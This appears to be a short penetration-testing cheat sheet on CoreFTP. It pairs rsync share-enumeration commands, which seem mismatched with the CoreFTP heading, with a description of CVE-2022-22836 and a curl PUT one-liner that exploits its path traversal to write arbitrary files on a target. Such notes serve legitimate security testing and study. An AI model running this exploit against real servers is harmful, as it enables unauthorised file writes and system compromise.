CoreFTP (TCP/21), (TCP/22) - SFTP (SSH), (TCP/990) - FTPS (SECURE)

Fast, reliable, FTP client software with SFTP (SSH), SSL, and TLS support. Download a free, secure ftp program

Usage

    Accessing shares

      nc -nv 127.0.0.1 873

      Once insede you must type #list in order to list all shares

      In case we would like to check what content is inside a share we could perform

      rsync -av --list-only rsync://127.0.0.1/$sharename

Exploitation

    CVE-2022-22836

      Previous versions of CoreFTP 727 are affected by a path traversal vulnerability which also allows to create files in the target computer. This vulnerability is for an FTP service that does not correctly process the HTTP PUT request and leads to an authenticated directory/path traversal, and arbitrary file write vulnerability

      This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files

      curl -k -X PUT -H "Host: TARGET_IP" --basic -u username:password --data-binary "PAYLOAD" --path-as-is https://TARGET_IP/../../../../../../whoops
